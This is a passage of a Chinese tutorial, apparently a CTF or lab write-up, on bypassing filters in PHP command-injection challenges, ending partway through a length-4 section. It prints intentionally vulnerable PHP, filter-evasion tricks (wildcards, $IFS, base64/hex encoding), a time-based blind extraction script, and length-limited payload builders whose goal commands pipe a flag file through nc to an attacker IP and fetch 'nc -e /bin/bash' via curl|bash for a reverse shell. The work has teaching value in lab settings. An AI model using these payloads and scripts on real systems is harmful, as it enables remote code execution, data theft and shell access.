<h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">if(isset($cmd))&#123;</span><br><span class="line">    $cmd = preg_replace(&quot;# #&quot;,&quot;&quot;,$cmd);</span><br><span class="line">    echo &quot;过滤后的命令：&quot;.$cmd.&quot;&lt;/br &gt;&quot;;</span><br><span class="line">    echo &quot;命令执行结果如下：&quot;;</span><br><span class="line">    system($cmd);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<ol>
<li>大括号{cat,flag.php}</li>
<li>$IFS代替空格：$IFS、${IFS}、$IFS$9，cat$IFSflag.php<br>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。<br>单纯<code>$IFS2</code>，<code>$IFS2</code>被bash解释器当错变量名，输出不了结果，加一个{}就固定了变量名。<br><code>$IFS$9</code>后面加个<code>$</code>与{}类似，起截断作用，<code>$9</code>是当前系统shell进程第九个参数持有者，始终为空字符串。  </li>
<li>重定向字符&lt;,&lt;&gt;，cat&lt;flag.php<br>“&lt;”表示的是输入重定向的意思，就是把&lt;后面跟的文件取代键盘作为新的输入设备。  </li>
<li>%09(Tab),%20(space),cat%09flag.php</li>
</ol>
<h2 id="文件名过滤绕过"><a href="#文件名过滤绕过" class="headerlink" title="文件名过滤绕过"></a>文件名过滤绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    $cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">    if (!preg_match(&quot;/flag|system|php/i&quot;, $cmd)) &#123;</span><br><span class="line">        eval($cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;命令有问题哦，来黑我丫！！！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flag|system|php被过滤  </p>
<ol>
<li>通配符<code>？</code>，<code>*</code>绕过<br>通配符是一种特殊语句，主要有问号(?)和星号(*)，用来模糊搜索文件。<br><code>?</code>在linux里面可以进行代替字母。<code>?</code>仅代表单个字符串，但此单字必须存在。  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat fl?g.ph?</span><br></pre></td></tr></table></figure>
<code>*</code>在linux里面可以进行模糊匹配。<code>*</code>可以代表任何字符串。  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat f*</span><br></pre></td></tr></table></figure></li>
<li>单引号、双引号绕过<br><code>&#39;&#39;、&quot;&quot;</code>空字符  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;cat fl&quot;&quot;ag.ph&quot;&quot;p&#x27;);</span><br></pre></td></tr></table></figure></li>
<li>反斜线\绕过<br>把特殊字符去掉功能性，单纯表示为字符串。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat fl\ag.p\hp</span><br></pre></td></tr></table></figure></li>
<li>特殊变量：<code>$1</code>到<code>$9</code>、<code>$@</code>和<code>$*</code>等<br>输出为空  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat fl$1ag.p$9hp</span><br></pre></td></tr></table></figure></li>
<li>内联执行<br>自定义字符串，再拼接起来  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=f;d=ag;c=l;cat $a$c$d.txt</span><br><span class="line">//表示cat flag.txt</span><br></pre></td></tr></table></figure></li>
<li>利用linux中的环境变量<br>使用环境变量里的字符执行变量<br><code>echo $PATH</code>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br></pre></td></tr></table></figure>
<code>echo f$&#123;PATH:5:1&#125;</code><br>使用环境变量PATH里的第5个字符，（从0开始计数，”l”为第五个字符），显示1个字符；  得到<code>fl</code><br>使用环境变量PATH里的第8个字符，（从0开始计数，”a”为第五个字符），显示1个字符；  得到<code>fla</code><br><code>echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;$&#123;PATH:66:1&#125;.$&#123;PATH:93:1&#125;h$&#123;PATH:93:1&#125;</code>,得到<code>flag.php</code></li>
</ol>
<h2 id="常见文件读取命令绕过"><a href="#常见文件读取命令绕过" class="headerlink" title="常见文件读取命令绕过"></a>常见文件读取命令绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    $cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">    if (!preg_match(&quot;/flag|php|cat|sort|shell|\&#x27;/i&quot;, $cmd)) &#123;</span><br><span class="line">        eval($cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;再来黑我丫！！！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>绕过方法：<br>一、tac：反向显示<br>与cat功能类似，但是反向显示，从最后一行往前开始显示。<br>二、more：一页一页的显示档案内容；<br>三、less：与more类似；<br>四、tail：查看末尾几行；默认显示最后10行<br>五、nl：显示的时候，顺便输出行号<br>六、od：以二进制的方式读取档案内容；使用时使用od -A d -c<br>七、xxd：读取二进制文件；<br>八、sort：主要用于排序文件；<br>这里被过滤了，使用<code>passthru(&quot;/usr/bin/so?t fla\g.ph\p&quot;);</code><br>九、uniq：报告或删除文件中重复的行；<br>十、file -f：报错出具体内容；<br>十一、grep：在文本中查找指定的字符串；<br><code>?cmd=passthru(&quot;grep fla fla*&quot;)</code>,从fla*文本文件中搜索包含”fla”字符串的行  </p>
<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    $cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">    if (!preg_match(&quot;/flag|php|cat|sort|shell/i&quot;, $cmd)) &#123;</span><br><span class="line">        eval($cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;再来黑我丫！！！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>绕过原理：<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231020223252.png"><br>一、base64编码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">S = <span class="string">b&#x27;cat flag.php&#x27;</span></span><br><span class="line">e64 = base64.b64encode(S)</span><br><span class="line"><span class="built_in">print</span>(e64)</span><br></pre></td></tr></table></figure>
<p><code>cat flag -&gt; Y2F0IGZsYWcucGhw</code><br><code>echo Y2F0IGZsYWcucGhw | base64 -d</code>,<code>|</code>把前面指令执行的结果，变成后面指令的参数，解码读取命令<br><code>echo Y2F0IGZsYWcucGhw | base64 -d | /bin/bash</code>把cat flag放进bash里执行命令<br>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`echo Y2F0IGZsYWcucGhw | base64 -d `</span><br><span class="line">$(echo Y2F0IGZsYWcucGhw | base64 -d )</span><br></pre></td></tr></table></figure>
<p>二、base32编码<br>一样的原理<br>三、HEX编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">s = b&quot;tac flag.php&quot;</span><br><span class="line">h = binascii.b2a_hex(s)</span><br><span class="line">print(h)</span><br></pre></td></tr></table></figure>
<p>得到<code>74616320666c61672e706870</code> 所以<code>echo Y2F0IGZsYWcucGhw | xxd -r -p | bash</code><br><code>xxd</code>：二进制显示和处理文件工具，<code>-r -p</code>将纯16进制转储的反向输出打印为了ASCII格式。<br>四、shellcode编码<br>16进制的机器码，<code>printf &quot;\x74\x61\x63\x20\x66\x6clx61\x67\x2e\x70\x68\x70&quot;|bash</code><br>或  <code>echo &quot;\x74\x61\x63\x20\x66\x6clx61\x67\x2e\x70\x68\x70&quot;|bash</code>  </p>
<h2 id="无回显时间盲注"><a href="#无回显时间盲注" class="headerlink" title="无回显时间盲注"></a>无回显时间盲注</h2><p>页面无法shell反弹或者无法回显忙或者没有写入权限，可尝试命令盲注。根据返回的时间来进行判断；<br>读取文件指定行的指定位置的字符；<br>相关命令：<br><strong>一、sleep</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep 5</span><br></pre></td></tr></table></figure>
<p>5秒之后返回结果<br><strong>二、awk NR</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php |awk NR==1</span><br></pre></td></tr></table></figure>
<p>读取flag.php的第一行，awk逐行获取数据<br><strong>三、cut -c</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php | awk NR==1 | cut -c 1</span><br></pre></td></tr></table></figure>
<p>cut命令逐列获取单个字符，这里读取flag.php的第一行的第一个字符<br><strong>四、if语句</strong><br>判断命令是否执行  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if [ $(cat flag | awk NR==2 | cut -c 1)==F ];then sleep 2;fi</span><br></pre></td></tr></table></figure>
<p>if[]里的判断语句为真，则执行sleep 2，休眠2秒后返回结果<br>使用方法：ls&#x2F;查看根目录来获取flag文件名  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &quot;http://127.0.0.1/class08/1.php&quot;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">for i in range(1,5):</span><br><span class="line">    for j in range(1,55):</span><br><span class="line">        #ascii码表</span><br><span class="line">        for k in range(32,128):</span><br><span class="line">            k = chr(k)</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">            payload = &quot;?cmd=&quot;+f&quot;if [`ls | awk NR==&#123;i&#125; | cut -c &#123;j&#125;` == &#123;k&#125;];then sleep 2;fi&quot;</span><br><span class="line">            try:</span><br><span class="line">                requests.get(url = url+payload,timeout=(1.5,1.5))</span><br><span class="line">            except:</span><br><span class="line">                result += k</span><br><span class="line">                print(result)</span><br><span class="line">                break</span><br><span class="line">    result += &quot; &quot;</span><br></pre></td></tr></table></figure>
<p>得知文件名后更改脚本即可  </p>
<h2 id="长度过滤绕过前置知识"><a href="#长度过滤绕过前置知识" class="headerlink" title="长度过滤绕过前置知识"></a>长度过滤绕过前置知识</h2><p><strong>相关命令</strong>  </p>
<ul>
<li>通过&gt;来创建文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo lhq &gt; a</span><br></pre></td></tr></table></figure>
创建文件a，并把字符串’lhq’写入到文件a里；<br>通过&gt;来将命令执行结果写入文件会覆盖掉文件原本的内容；  </li>
<li>通过&gt;&gt;追加内容<br>在原本文件内容后面追加’love ljh’<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021115705.png"><br>单独使用&gt;,如&gt;b,则是直接创建文件b，类似touch b<br><strong>命令换行</strong><br>在没有写完的命令后面加<code>\</code>,可以将一条命令写在多行：<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021121233.png"><br><strong>ls -t命令</strong><br>ls命令按字母顺序显示文件名<br>ls -t按时间顺序显示文件名（后创建的排在前面），只能精确到秒<br><strong>组合运用</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;ag</span><br><span class="line">&gt;l\\</span><br><span class="line">&gt;f\\</span><br><span class="line">&gt;cat\ \\</span><br></pre></td></tr></table></figure>
<img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021122452.png"><br>创建好文件，按时间顺序显示，并把执行结果写入文件x里；<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -t &gt;x</span><br></pre></td></tr></table></figure>
<img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021122614.png"><br>执行文件x<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021122653.png"><br>或者使用<code>sh x</code>，也可成功命令执行，则在对命令长度有限制时，把一些很短的文件名拼接成可执行命令  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;创建很短的文件名</span><br><span class="line">ls -t按时间顺序列出文件名，按行储存</span><br><span class="line">\连接换行命令</span><br><span class="line">sh从文件中读取命令</span><br></pre></td></tr></table></figure>
<strong>dir及星号和rev</strong><br><code>dir</code>：基本上和ls一样，但有两个好处:<br>一是开头字母是d，这使得它在alphabetical序中靠前;<br>二是按列输出，不换行。<br><code>*</code>：相当于<code>$(dir *)</code><br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021124319.png"><br>如果第一个文件名是命令的话就会执行命令，返回执行的结果，之后的文件名作为参数传入<br>rev：可以反转文件每一行的内容</li>
</ul>
<h2 id="长度限制为7绕过方法解析"><a href="#长度限制为7绕过方法解析" class="headerlink" title="长度限制为7绕过方法解析"></a>长度限制为7绕过方法解析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">function filter($argv)&#123;</span><br><span class="line">    $a = str_replace(&quot;/\*|\?|/&quot;,&quot;=====&quot;,$argv);</span><br><span class="line">    return $a;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;cmd&#x27;]) &amp;&amp; strlen($_GET[&#x27;cmd&#x27;]) &lt;= 7) &#123;</span><br><span class="line">    exec(filter($_GET[&#x27;cmd&#x27;]));</span><br><span class="line">&#125; else  &#123;</span><br><span class="line">    echo &quot;flag in local path flag file!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>GET提交cmd，限制长度&lt;&#x3D;7,并且不能写入<code>*</code>和<code>?</code><br>期望执行的命令：<code>cat flag | nc 192.168.1.240 7777</code><br>kali的IP地址<code>192.168.1.240</code>，监听端口7777：<code>nc -lvp 7777</code><br>cat flag展示内容，再通过nc反弹，提交到<code>192.168.1.240:7777</code><br>步骤一：创建文件  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&gt;7777</span><br><span class="line">?cmd=&gt;\ \\</span><br><span class="line">?cmd=&gt;240\\</span><br><span class="line">?cmd=&gt;1.\\</span><br><span class="line">?cmd=&gt;168.\\</span><br><span class="line">?cmd=&gt;192.\\</span><br><span class="line">?cmd=&gt;c\ \\</span><br><span class="line">?cmd=&gt;\|n\\</span><br><span class="line">?cmd=&gt;flag\\</span><br><span class="line">?cmd=&gt;t\ \\</span><br><span class="line">?cmd=&gt;ca\\</span><br></pre></td></tr></table></figure>
<p>步骤二：将文件名按顺序写入到文件  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -t&gt;a</span><br></pre></td></tr></table></figure>
<p>步骤三：执行脚本  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=sh a</span><br></pre></td></tr></table></figure>
<p>python脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">baseurl = &quot;http://192.168.1.6:19080/class09/2/index.php?cmd=&quot;</span><br><span class="line">s = requests.session()</span><br><span class="line">list=[</span><br><span class="line">    &#x27;&gt;7777&#x27;,</span><br><span class="line">    &#x27;&gt;1\%20\\&#x27;,</span><br><span class="line">    &#x27;&gt;16\\&#x27;,</span><br><span class="line">    &#x27;&gt;1.\\&#x27;,</span><br><span class="line">    &#x27;&gt;168.\\&#x27;,</span><br><span class="line">    &#x27;&gt;2.\\&#x27;,</span><br><span class="line">    &#x27;&gt;19\\&#x27;,</span><br><span class="line">    &#x27;&gt;c\%20\\&#x27;,</span><br><span class="line">    &#x27;&gt;\|n\\&#x27;,</span><br><span class="line">    &#x27;&gt;ag\\&#x27;,</span><br><span class="line">    &#x27;&gt;fl\\&#x27;,</span><br><span class="line">    &#x27;&gt;t\ \\&#x27;,</span><br><span class="line">    &#x27;&gt;ca\\&#x27;,</span><br><span class="line">    &#x27;ls -t&gt;a&#x27;</span><br><span class="line">]</span><br><span class="line">for i in list:</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    url = baseurl+str(i)</span><br><span class="line">    s.get(url)</span><br><span class="line">s.get(baseurl+&quot;sh a&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="长度限制为5绕过方法"><a href="#长度限制为5绕过方法" class="headerlink" title="长度限制为5绕过方法"></a>长度限制为5绕过方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">function filter($argv)&#123;</span><br><span class="line">    $a = str_replace(&quot;/\*|\?|/&quot;,&quot;=====&quot;,$argv);</span><br><span class="line">    return $a;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;cmd&#x27;]) &amp;&amp; strlen($_GET[&#x27;cmd&#x27;]) &lt;= 5) &#123;</span><br><span class="line">    exec(filter($_GET[&#x27;cmd&#x27;]));</span><br><span class="line">&#125; else  &#123;</span><br><span class="line">    echo &quot;flag in local path flag file!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么就出现了新的问题<br><code>ls -t&gt;a</code>字符串长度为7，超过限制5<br><code>&gt;\ \\</code>构造空格的字符串长度最少为5，超过一个空格便无法构造，长度限制为7时的命令和步骤不再适用<br><strong>解决方法</strong><br>更换期望执行的命令：<code>curl 192.168.1.240|bash</code><br>在kali中开启web服务（80端口），默认页面index.html<br><code>python -m http.server 80</code><br>写入命令<code>nc 192.168.1.240 7777 -e /bin/bash</code>，并且在命令行<code>nc -lvp 7777</code>监听端口<br>目标靶机执行<code>curl 192.168.1.240</code>，访问到<code>curl 192.168.1.240</code>并下载默认页面index.html<br><code>|bash</code>把下载的index.html交给bash执行，即执行<code>nc 192.168.1.240 7777 -e /bin/bash</code><br>步骤一：构造<code>ls -t&gt;y</code><br>ls默认排序无法正常排出<code>&#39;ls\&#39;  &#39; \&#39;  &#39;-t\&#39;  &#39;&gt;y&#39;</code>,<code>&#39;ls\&#39;</code>默认排在最后<br>可以先创建文件<code>ls\</code>,使用<code>&gt;ls\\</code>,再创建文件<code>_</code>，并把<code>ls\</code>写入文件<code>_</code>,使用<code>ls&gt;_</code>,再写入其他文件<br>并将新的ls的文件名使用<code>&gt;&gt;</code>追加进<code>_</code>，从而在<code>_</code>中包含<code>ls -t&gt;y</code>，使用<code>sh _</code>即可执行<code>ls -t&gt;y</code><br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20231021142606.png"><br>步骤二：分解命令，创造文件  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#&gt;bash</span><br><span class="line">#&gt;\|\\</span><br><span class="line">#&gt;61\\</span><br><span class="line">#&gt;1\\</span><br><span class="line">#&gt;1.\\</span><br><span class="line">#&gt;68\\</span><br><span class="line">#&gt;2.\\</span><br><span class="line">#&gt;19\\</span><br><span class="line">#&gt;\ \\</span><br><span class="line">#&gt;rl\\</span><br><span class="line">#&gt;cu\\</span><br></pre></td></tr></table></figure>
<p>执行<code>sh _</code>，即可执行ls -t&gt;y,创建文件y并把文件名按时间排序<br>步骤三：执行脚本<code>sh y</code><br>python代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">baseurl = &quot;http://192.168.1.6:19080/class09/3/index.php?cmd=&quot;</span><br><span class="line">s = requests.session()</span><br><span class="line"># 将ls -t 写入文件_</span><br><span class="line">list=[</span><br><span class="line">    &quot;&gt;ls\\&quot;,</span><br><span class="line">    &quot;ls&gt;_&quot;,</span><br><span class="line">    &quot;&gt;\ \\&quot;,</span><br><span class="line">    &quot;&gt;-t\\&quot;,</span><br><span class="line">    &quot;&gt;\&gt;y&quot;,</span><br><span class="line">    &quot;ls&gt;&gt;_&quot;</span><br><span class="line">]</span><br><span class="line"># curl 192.168.1.161/1|bash</span><br><span class="line">list2=[</span><br><span class="line">    &quot;&gt;bash&quot;,</span><br><span class="line">    &quot;&gt;\|\\&quot;,</span><br><span class="line">    &quot;&gt;\/\\&quot;,</span><br><span class="line">    &quot;&gt;61\\&quot;,</span><br><span class="line">    &quot;&gt;1\\&quot;,</span><br><span class="line">    &quot;&gt;1.\\&quot;,</span><br><span class="line">    &quot;&gt;8.\\&quot;,</span><br><span class="line">    &quot;&gt;16\\&quot;,</span><br><span class="line">    &quot;&gt;2.\\&quot;,</span><br><span class="line">    &quot;&gt;19\\&quot;,</span><br><span class="line">    &quot;&gt;\ \\&quot;,</span><br><span class="line">    &quot;&gt;rl\\&quot;,</span><br><span class="line">    &quot;&gt;cu\\&quot;</span><br><span class="line">]</span><br><span class="line">for i in list:</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    url = baseurl+str(i)</span><br><span class="line">    s.get(url)</span><br><span class="line">for j in list2:</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    url = baseurl+str(j)</span><br><span class="line">    s.get(url)</span><br><span class="line">s.get(baseurl+&quot;sh _&quot;)</span><br><span class="line">s.get(baseurl+&quot;sh y&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="长度限制为4绕过方法"><a href="#长度限制为4绕过方法" class="headerlink" title="长度限制为4绕过方法"></a>长度限制为4绕过方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">function filter($argv)&#123;</span><br><span class="line">    str_replace(&quot;/\?|/&quot;,&quot;=====&quot;,$argv);</span><br><span class="line">    return $argv;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;cmd&#x27;]) &amp;&amp; strlen($_GET[&#x27;cmd&#x27;]) &lt;= 4) &#123;</span><br><span class="line">    exec(filter($_GET[&#x27;cmd&#x27;]));</span><br><span class="line">&#125; else  &#123;</span><br><span class="line">    echo &quot;flag in local path flag file!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>新的问题：<code>ls&gt;&gt;_</code>追加命令长度最少为5，超过4个，不再适用<br><strong>解决方法</strong><br>步骤一：构造<code>ls -t&gt;g</code>  </p>
